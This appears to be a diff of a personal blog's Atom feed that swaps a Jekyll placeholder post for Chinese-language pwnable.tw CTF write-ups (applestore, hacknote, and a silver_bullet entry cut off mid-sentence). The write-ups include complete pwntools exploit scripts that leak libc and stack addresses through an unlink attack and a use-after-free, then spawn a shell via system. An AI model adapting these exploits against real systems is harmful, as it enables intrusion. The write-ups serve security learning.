@@ -1,17 +1,882 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://www.cameudis.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cameudis.com/" rel="alternate" type="text/html" /><updated>2024-11-16T21:50:58+08:00</updated><id>https://www.cameudis.com/feed.xml</id><title type="html">Y²的博客</title><subtitle>料峭春风吹酒醒，微冷，山头斜照却相迎。回首向来萧瑟处，归去，也无风雨也无晴。</subtitle><entry><title type="html">Welcome to Jekyll!</title><link href="https://www.cameudis.com/jekyll/update/2024/11/16/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2024-11-16T20:11:30+08:00</published><updated>2024-11-16T20:11:30+08:00</updated><id>https://www.cameudis.com/jekyll/update/2024/11/16/welcome-to-jekyll</id><content type="html" xml:base="https://www.cameudis.com/jekyll/update/2024/11/16/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4001/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4001/" rel="alternate" type="text/html" /><updated>2024-11-16T23:35:55+08:00</updated><id>http://localhost:4001/feed.xml</id><title type="html">Y² 的博客</title><subtitle>料峭春风吹酒醒，微冷，山头斜照却相迎。回首向来萧瑟处，归去，也无风雨也无晴。</subtitle><entry><title type="html">pwnable.tw applestore</title><link href="http://localhost:4001/2022/09/08/pwnable-tw-applestore-writeup.html" rel="alternate" type="text/html" title="pwnable.tw applestore" /><published>2022-09-08T16:41:53+08:00</published><updated>2022-09-08T16:41:53+08:00</updated><id>http://localhost:4001/2022/09/08/pwnable-tw-applestore-writeup</id><content type="html" xml:base="http://localhost:4001/2022/09/08/pwnable-tw-applestore-writeup.html"><![CDATA[<p>把局部变量用作静态变量，是不是一种栈上数据的UAF……</p>
 
-<p>Jekyll requires blog post files to be named according to the following format:</p>
+<!-- more -->
 
-<p><code class="language-plaintext highlighter-rouge">YEAR-MONTH-DAY-title.MARKUP</code></p>
+<h2 id="程序分析">程序分析</h2>
 
-<p>Where <code class="language-plaintext highlighter-rouge">YEAR</code> is a four-digit number, <code class="language-plaintext highlighter-rouge">MONTH</code> and <code class="language-plaintext highlighter-rouge">DAY</code> are both two-digit numbers, and <code class="language-plaintext highlighter-rouge">MARKUP</code> is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.</p>
+<p>弄懂本题逻辑的关键点在于弄懂其数据结构是什么，而本人花了一天才终于搞明白，居然是用<strong>双向链表</strong>来表示购物车。</p>
 
-<p>Jekyll also offers powerful support for code snippets:</p>
+<p>链表结点结构如下：</p>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">print_hi</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
-  <span class="nb">puts</span> <span class="s2">"Hi, </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">"</span>
-<span class="k">end</span>
-<span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
-<span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>
+<p><img src="/images/applestore_1.png" alt="struct cart_item" /></p>
 
-<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry></feed>
+<p>而程序中有很多的地方都有经典的双向链表操作，比如insert函数中是把结点添加到链表尾部，remove函数会把结点<strong>unlink</strong>出双向链表，cart函数会遍历链表等等……</p>
+
+<p><img src="/images/applestore_2.png" alt="remove(): unlink" /></p>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>checkout函数将会调用cart函数遍历并计算购物车中所有商品的价格，如果是一个特定值（7174）的话，将会触发一个彩蛋：往购物车的尾部添加一个iPhone8！</p>
+
+<p>然而这个iPhone8就是漏洞的所在——<strong>iPhone8结点是一个本地变量，然而程序把这个本地变量当作静态变量使用了！</strong></p>
+
+<p>而作为一个菜单题，很多选项背后的函数，都会在iPhome8结点位置附近（iPhone8结点位于ebp-0x20）放置一个BUFFER来存储输入（BUFFER位于ebp-0x22），因此实际上<strong>可以控制iPhone8结点的值</strong>。</p>
+
+<p>在控制值之后，我们可以利用cart函数泄露任意地址数据，也可以使用remove函数进行unlink attack来覆写数据，但值将会受到限制，因为使用指令向一个不可写地址写入数据将导致程序崩溃。</p>
+
+<p>由于程序显然不存在RWX段，因此我们想要进行unlink attack，fake fd和fake bk都必须是一个可写的段的地址。我们想要劫持控制流，必须要采取别的方法。</p>
+
+<p>这个方法我没有想到，是去网上看大佬WP学到的，我将其称为：<strong>Stack Pivot Lite</strong>（只劫持ebp的stack pivot）。</p>
+
+<p>具体来说：在handle函数（处理菜单的函数）中，每次循环的一开始都会往BUFFER里读入数据并调用atoi函数将其转换为数字。而这个BUFFER作为栈上的变量，是使用<code class="language-plaintext highlighter-rouge">[ebp + offset]</code>的格式来引用的（见下面的汇编代码）。
+如果可以<strong>劫持ebp</strong>，那么实际上我们可以劫持read到别的地方（如atoi的got表位置），然后读入system的地址加上”;/bin/sh”，如此一来，执行atoi的时候实际上执行的是system(“不可打印字符;/bin/sh”)！！</p>
+
+<pre><code class="language-asm">mov     dword ptr [esp+4], 15h ; nbytes
+lea     eax, [ebp+nptr]
+mov     [esp], eax
+call    my_read
+
+lea     eax, [ebp+nptr]
+mov     [esp], eax      ; nptr
+call    _atoi
+</code></pre>
+
+<p>那么如何劫持ebp呢？用unlink来写入即可，因为fake fd（got表附近）和fake bk（栈）都是可写的，所以这次unlink可以正常运行！</p>
+
+<h2 id="漏洞利用">漏洞利用</h2>
+
+<p>脚本逻辑如下：
+首先用循环来填充购物车，将总金额凑满7174元。（求多元一次方程的整数解问题，或许是线代的基本功？但是我早就忘了（悲），不过好运的是，我第一次凑就突然凑出来了）</p>
+
+<p>然后在购物车中加入iPhone8，利用Cart函数先后泄露libc地址（利用GOT表）和栈地址（利用_environ）。</p>
+
+<p>第三步，通过<strong>覆写remove函数栈帧上的saved ebp</strong>，来<strong>劫持handle函数的ebp</strong>，来劫持提供给read的实参指针。
+然后将atoi的got表指针修改为system()，等待handle函数调用 <code class="language-plaintext highlighter-rouge">atoi([ebp-0x22])</code> ，实际上执行的是 <code class="language-plaintext highlighter-rouge">system("不可打印字符;/bin/sh")</code> ，拿到Shell和Flag。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span>
+<span class="c1"># context.log_level='debug'
+</span>
+<span class="n">filename</span><span class="o">=</span><span class="s">"./applestore"</span>
+<span class="c1"># io = process([filename])
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10104</span><span class="p">)</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+
+<span class="n">libc_name</span><span class="o">=</span><span class="s">"./libc_32.so.6"</span>
+<span class="c1"># libc_name="/home/nss/glibc-all-in-one-master/libs/2.23-0ubuntu5_i386/libc.so.6"
+</span><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">Debug</span><span class="p">():</span>
+    <span class="n">gdb_script</span> <span class="o">=</span> <span class="s">"""
+    b *0x8048beb
+    """</span>
+    <span class="n">g</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdb_script</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">Add</span><span class="p">(</span><span class="n">ID</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ID</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">Remove</span><span class="p">(</span><span class="n">ID</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ID</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">List</span><span class="p">():</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'4'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'y'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">Checkout</span><span class="p">():</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'5'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'y'</span><span class="p">)</span>
+
+<span class="s">"""Edit metadata of iPhone 8 struct and print it"""</span>
+<span class="k">def</span> <span class="nf">List_Edit</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'4'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'yy'</span><span class="o">+</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">Unlink_Attack</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">bk</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'27'</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x8049000</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mh">0xdeadbeaf</span><span class="p">)</span><span class="o">+</span><span class="n">fd</span><span class="o">+</span><span class="n">bk</span><span class="p">)</span>
+
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+    <span class="n">Add</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="c1"># leak libc and stack:
+</span><span class="n">Checkout</span><span class="p">()</span>
+<span class="n">List_Edit</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x114514</span><span class="p">))</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'27: '</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'28: '</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="n">_environ_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_environ"</span><span class="p">]</span>
+<span class="n">success</span><span class="p">(</span><span class="s">"_environ_addr: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="n">List_Edit</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">_environ_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x114514</span><span class="p">))</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'27: '</span><span class="p">)</span>
+<span class="n">environ</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'28: '</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
+<span class="n">success</span><span class="p">(</span><span class="s">"environ: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">))</span>
+
+<span class="n">savedrbp_addr</span> <span class="o">=</span> <span class="n">environ</span> <span class="o">-</span> <span class="mh">0xffffd13c</span> <span class="o">+</span> <span class="mh">0xffffd038</span>
+<span class="n">success</span><span class="p">(</span><span class="s">"savedrbp_addr: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">savedrbp_addr</span><span class="p">))</span>
+
+<span class="c1"># unlink attack
+# Debug()
+</span><span class="n">Unlink_Attack</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"atoi"</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x22</span><span class="p">),</span> <span class="n">pack</span><span class="p">(</span><span class="n">savedrbp_addr</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">))</span> <span class="c1"># saved rbp
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span><span class="o">+</span><span class="sa">b</span><span class="s">";/bin/sh"</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[把局部变量用作静态变量，是不是一种栈上数据的UAF……]]></summary></entry><entry><title type="html">pwnable.tw hacknote</title><link href="http://localhost:4001/2022/09/01/pwnable-tw-hacknote-writeup.html" rel="alternate" type="text/html" title="pwnable.tw hacknote" /><published>2022-09-01T23:04:01+08:00</published><updated>2022-09-01T23:04:01+08:00</updated><id>http://localhost:4001/2022/09/01/pwnable-tw-hacknote-writeup</id><content type="html" xml:base="http://localhost:4001/2022/09/01/pwnable-tw-hacknote-writeup.html"><![CDATA[<p>UAF，以及发现了使用 <code class="language-plaintext highlighter-rouge">system()</code> 的小技巧。</p>
+
+<h2 id="程序分析">程序分析</h2>
+
+<p>保护：</p>
+
+<pre><code class="language-txt">[*] '/home/nss/Desktop/pwnable.tw/hacknote/hacknote'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8047000)
+</code></pre>
+
+<p>作为一个菜单题，本题菜单如下：</p>
+
+<pre><code class="language-txt">----------------------
+       HackNote       
+----------------------
+ 1. Add note          
+ 2. Delete note       
+ 3. Print note        
+ 4. Exit              
+----------------------
+</code></pre>
+
+<p><strong>Add note：</strong>
+申请一个0x16的区块（<code class="language-plaintext highlighter-rouge">malloc(0x8)</code>）和一个用户决定大小的区块(<code class="language-plaintext highlighter-rouge">malloc(size)</code>)，我将其称为<strong>控制区块</strong>和<strong>用户区块</strong>。
+在控制区块的8字节用户可用空间中，分别塞入一个函数地址、和用户区块的地址。
+然后进行 <code class="language-plaintext highlighter-rouge">read(0, malloc(size), size)</code>，允许用户输入内容至用户区块。</p>
+
+<p>在一个固定地址（<code class="language-plaintext highlighter-rouge">0x0804a050</code>），存放着一个指针数组，用来存储历次分配产生的控制区块的地址。
+为了防止溢出，程序在每次add note时都会先检查全局变量note_count（自己取的名），并且在分配成功后让note_count++。最多可以分配5个区块。</p>
+
+<p><strong>Delete note：</strong>
+输入index，将对应的用户数组和控制数组释放（注意先后顺序）。
+但这里并不会让note_count–，也不会从全局指针数组中删除控制区块。<strong>只会free而已。</strong></p>
+
+<p><strong>Print note：</strong>
+输入index，将对应控制区块的用户可用空间地址压栈（也就是函数的指针的地址），调用对应控制数组存放的函数（该函数会将arg0加4后作为一个 <code class="language-plaintext highlighter-rouge">char*</code> 调用 <code class="language-plaintext highlighter-rouge">puts</code> 输出）。</p>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>本题没有buffer overflow（都是调用read完成），也没有栈上的漏洞。
+唯一的漏洞在于UAF——<strong>程序在使用delete note来free区块之后，依然能够使用print note来使用对应区块存放的数据（具体来说，调用存放的函数指针）。</strong></p>
+
+<p>所以只需要构造一下，使得<strong>已经被释放的控制区块被分配作用户区块</strong>，这样就可以在控制区块中写入信息，控制控制流。</p>
+
+<h2 id="利用-exploitation">利用 Exploitation</h2>
+
+<p>我先随意 <code class="language-plaintext highlighter-rouge">add_note</code> 两次并释放之，两个原控制区块都被 <code class="language-plaintext highlighter-rouge">free</code> 到fast bin中。然后再 <code class="language-plaintext highlighter-rouge">add_note(8)</code>，那么此时原来的两个控制区块，一个被用作新的控制区块，另一个被用作了用户区块。</p>
+
+<p>这时，我往用户区块中塞入两个4Bytes：一个是程序特化的打印函数，会把参数当作地址+4后，调用 <code class="language-plaintext highlighter-rouge">puts</code> 函数打印之；还有一个是got表中 <code class="language-plaintext highlighter-rouge">puts</code> 的地址（这里任意got表中函数都可以）。
+然后调用print note，这样程序就会把got表中 <code class="language-plaintext highlighter-rouge">puts</code> 的地址打印出来，那么libc基地址就有了。</p>
+
+<p>之后可以故技重施，再把那两个受害者区块 <code class="language-plaintext highlighter-rouge">free</code> 再 <code class="language-plaintext highlighter-rouge">malloc</code> ，此时再往用户区块中塞入两个4Bytes：一个是 <code class="language-plaintext highlighter-rouge">system()</code> 地址，<strong>另一个是 <code class="language-plaintext highlighter-rouge">b'sh\x00'</code></strong>。
+由于print note会把对应控制区块的用户可用空间压栈，也就是此时的 <code class="language-plaintext highlighter-rouge">&amp;system()</code>，所以实际上我执行的是 <code class="language-plaintext highlighter-rouge">system(pack(system()) + ";sh")</code>，<strong>通过分号来bypass前四个字节的不可打印字符</strong>。</p>
+
+<p>（除该技巧外，别的部分早就想出来了，就该技巧卡了好久，最后看网上wp学到了……）</p>
+
+<p>EXP如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span>
+<span class="c1"># context.log_level='debug'
+</span>
+<span class="n">filename</span><span class="o">=</span><span class="s">"./hacknote"</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">filename</span><span class="p">])</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+
+<span class="n">libc_name</span><span class="o">=</span><span class="s">"libc_32.so.6"</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add_note</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your choice :'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Note size :'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Content :'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete_note</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your choice :'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Index :'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">print_note</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your choice :'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Index :'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10102</span><span class="p">)</span>
+
+<span class="c1"># leak libc_addr (using got["puts"], but actually all got[*] will work as same)
+</span><span class="n">add_note</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">)</span>
+<span class="n">add_note</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="sa">b</span><span class="s">'111'</span><span class="p">)</span>
+<span class="n">delete_note</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">delete_note</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">add_note</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x804862b</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]))</span>
+<span class="n">print_note</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="c1"># calculate libc_addr
+</span><span class="n">mes</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'HackNote'</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">mes</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="c1"># system(b'\x??'*4 + b';sh\x00')
+</span><span class="n">delete_note</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">add_note</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span><span class="o">+</span><span class="sa">b</span><span class="s">';sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="n">print_note</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[UAF，以及发现了使用 system() 的小技巧。]]></summary></entry><entry><title type="html">pwnable.tw silver_bullet</title><link href="http://localhost:4001/2022/08/07/pwnable-tw-silver-bullet-writeup.html" rel="alternate" type="text/html" title="pwnable.tw silver_bullet" /><published>2022-08-07T17:28:56+08:00</published><updated>2022-08-07T17:28:56+08:00</updated><id>http://localhost:4001/2022/08/07/pwnable-tw-silver-bullet-writeup</id><content type="html" xml:base="http://localhost:4001/2022/08/07/pwnable-tw-silver-bullet-writeup.html"><![CDATA[<p>Off-by-NULL
+<!-- more --></p>
+
+<h2 id="功能描述">功能描述</h2>
+
+<p>循环打印一个菜单，可以选择生成子弹、升级子弹、攻击BOSS（成功了才能return）、或者exit(0)
+推测子弹结构如下：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_Bullet</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">description</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">power</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>生成子弹和升级子弹时，都会提示输入 <code class="language-plaintext highlighter-rouge">description</code> ，然后对输入的 <code class="language-plaintext highlighter-rouge">description</code> 使用 <code class="language-plaintext highlighter-rouge">strlen</code>，加到 <code class="language-plaintext highlighter-rouge">power</code> 上。
+在升级子弹时，description的大小限制为 <code class="language-plaintext highlighter-rouge">0x30-power</code>，读取到 <code class="language-plaintext highlighter-rouge">power_up</code> 的栈帧上。在更新 <code class="language-plaintext highlighter-rouge">power</code> 后将会用 <code class="language-plaintext highlighter-rouge">strncat()</code> 将新的 <code class="language-plaintext highlighter-rouge">description</code> 加到原来的 <code class="language-plaintext highlighter-rouge">description</code> 之后。</p>
+
+<h2 id="漏洞">漏洞</h2>
+
+<p>本题漏洞是对于 <code class="language-plaintext highlighter-rouge">strncat</code> 的误用。
+假设上述 <code class="language-plaintext highlighter-rouge">description</code> 已经有 0x2f 个字符，那么在 <code class="language-plaintext highlighter-rouge">power_up</code> 函数中，会限制只能读取一个字符。
